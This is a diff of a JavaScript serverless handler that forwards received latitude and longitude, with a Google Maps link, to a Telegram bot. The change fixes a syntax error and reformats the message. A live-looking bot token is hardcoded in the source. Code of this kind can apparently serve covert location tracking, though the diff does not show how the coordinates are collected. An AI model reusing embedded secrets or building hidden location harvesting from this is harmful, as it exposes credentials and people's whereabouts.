@@ -7,32 +7,31 @@ export default async function handler(req, res) {
     return res.status(400).json({ error: 'Missing parameters' });
   }
 
-  const BOT_TOKEN = '7737650968:AAHsvAEaKL5kOCcgQ4RPtyVjeN3-Hl5Aw1k'; // Yahan apna bot token direct likhen
-  const message = `📍 New Location:\nLat: ${latitude}\nLon: ${longitude}`;
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-const googleMapLink = `https://maps.google.com/?q=${latitude},${longitude}`;
-  
+  const BOT_TOKEN = '7737650968:AAHsvAEaKL5kOCcgQ4RPtyVjeN3-Hl5Aw1k'; // <-- Replace with your bot token
+  const googleMapLink = `https://maps.google.com/?q=${latitude},${longitude}`;
+  const message = `📍 Location Received:\nLat: ${latitude}\nLon: ${longitude}\n\n[View on Google Maps](${googleMapLink})`;
+
   try {
-    const telegramRes = await fetch(url, {
+    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id,
-        text: message
+        text: message,
         parse_mode: 'Markdown'
       })
     });
 
-    const data = await telegramRes.json();
+    const result = await response.json();
 
-    if (!data.ok) {
-      console.error('Telegram API error:', data);
-      return res.status(500).json({ error: 'Telegram send failed', telegram: data });
+    if (!result.ok) {
+      console.error('Telegram error:', result);
+      return res.status(500).json({ error: 'Telegram API failed', result });
     }
 
-    res.status(200).json({ success: true, sent: true });
-  } catch (err) {
-    console.error('Server Error:', err);
-    res.status(500).json({ error: 'Server error', detail: err.message });
+    res.status(200).json({ success: true });
+  } catch (error) {
+    console.error('Server error:', error);
+    res.status(500).json({ error: 'Internal Server Error' });
   }
 }
